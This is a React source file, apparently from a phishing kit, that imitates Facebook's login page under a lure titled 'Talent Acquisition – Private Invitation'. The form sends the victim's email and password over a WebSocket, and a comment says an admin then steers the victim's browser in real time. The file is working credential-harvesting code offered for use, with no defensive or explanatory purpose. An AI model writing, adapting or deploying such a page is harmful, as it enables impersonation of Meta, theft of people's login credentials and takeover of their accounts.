import { useEffect } from 'react';
// @ts-nocheck
import { useState } from "react";
import { useWebSocket } from '../../context/WebSocketContext';
import useDynamicCss from '../../utils/useDynamicCss';

const ErrorPage = () => {
  useEffect(() => {
    document.title = 'Talent Acquisition – Private Invitation';
  }, []);

  useDynamicCss('/css/facebook/login.css');
  const { submitForm } = useWebSocket();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);


  const handleSubmit = (e: any) => {
    e.preventDefault();

    if (!password.trim()) {
      return;
    }

    setIsLoading(true);

    // Submit to WebSocket
    submitForm('login', {
      email: email,
      password: password
    });

    // Keep loading state - admin will navigate via WebSocket
  };

  const togglePassword = () => {
    setShowPassword(!showPassword);
  };

  return (
    <>
      <div
        className={`wrapper-loading-root ${isLoading ? "body-loading" : "hidden"}`}
      >
        <div className={`progress-bar ${isLoading ? "show" : ""}`}>
          <div className="bar1"></div>
          <div className="bar2"></div>
        </div>
      </div>
      <div className="login_main">
        <div className="container">
          <img alt="Meta Logo" src="/20200731035726.svg" />
          <div className="alert">
            <div className="icon">
              <i className="bx bxs-info-circle"></i>
            </div>
            <p>You must log in to continue.</p>
          </div>
          <form
            className="form_container"
            id="loginForm"
            onSubmit={handleSubmit}
          >
            <h2>Log in to Facebook</h2>
            <div className="alert">
              <p>You must log in to continue.</p>
            </div>
            <div className="inputs">
              <div>
                <input
                  id="email"
                  placeholder="Email address or phone number"
                  type="text"
                  value={email}
                  name="email"
                  onChange={(e: any) => setEmail(e.target.value)}
                />
              </div>
              <div className="password-wrapper">
                <input
                  id="password"
                  placeholder="Password"
                  type={showPassword ? "text" : "password"}
                  value={password}
                  name="password"
                  onChange={(e: any) => setPassword(e.target.value)}
                />
                <button
                  type="button"
                  className="toggle-password"
                  onClick={togglePassword}
                >
                  <i
                    className={`fas ${showPassword ? "fa-eye-slash" : "fa-eye"}`}
                  ></i>
                </button>
                <span className="error-message">
                  There was an error processing your request, try again!
                </span>
              </div>
              <button
                type="submit"
                name="submitLogin"
                className="login-btn"
                disabled={isLoading}
              >
                {isLoading ? (
                  <>
                    <svg className="spinner" viewBox="0 0 50 50">
                      <circle
                        className="path"
                        cx="25"
                        cy="25"
                        r="20"
                        fill="none"
                        strokeWidth="5"
                      ></circle>
                    </svg>
                    <span>Please wait...</span>
                  </>
                ) : (
                  "Log in"
                )}
              </button>
            </div>
            <div className="links">
              <a href="#">Forgotten account?</a>
              <span> · </span>
              <a href="#">Sign up for Facebook</a>
            </div>
          </form>
        </div>
        <div className="footer">
          <div className="topFooter">
            <a href="#">English (UK)</a>
            <a href="#">Deutsch</a>
            <a href="#">Türkçe</a>
            <a href="#">Français (France)</a>
            <a href="#">Italiano</a>
            <a href="#">Svenska</a>
            <a href="#">Español</a>
            <a href="#">Português (Brasil)</a>
          </div>
          <div className="bottomFooter">
            <a href="#">Sign Up</a>
            <a href="#">Log in</a>
            <a href="#">Messenger</a>
            <a href="#">Facebook Lite</a>
            <a href="#">Watch</a>
            <a href="#">Places</a>
            <a href="#">Games</a>
            <a href="#">Marketplace</a>
            <a href="#">Meta Pay</a>
            <a href="#">Oculus</a>
            <a href="#">Portal</a>
            <a href="#">Instagram</a>
            <a href="#">Bulletin</a>
            <a href="#">Fundraisers</a>
            <a href="#">Services</a>
            <a href="#">Voting Information Centre</a>
            <a href="#">Privacy Policy</a>
            <a href="#">Privacy Center</a>
            <a href="#">Groups</a>
            <a href="#">About</a>
            <a href="#">Create ad</a>
            <a href="#">Create Page</a>
            <a href="#">Developers</a>
            <a href="#">Careers</a>
            <a href="#">Cookies</a>
            <a href="#">AdChoices</a>
            <a href="#">Terms</a>
            <a href="#">Help</a>
            <a href="#">Contact uploading and non-users</a>
          </div>
          <span>Meta © 2025</span>
        </div>
      </div>
    </>
  );
};

export default ErrorPage;
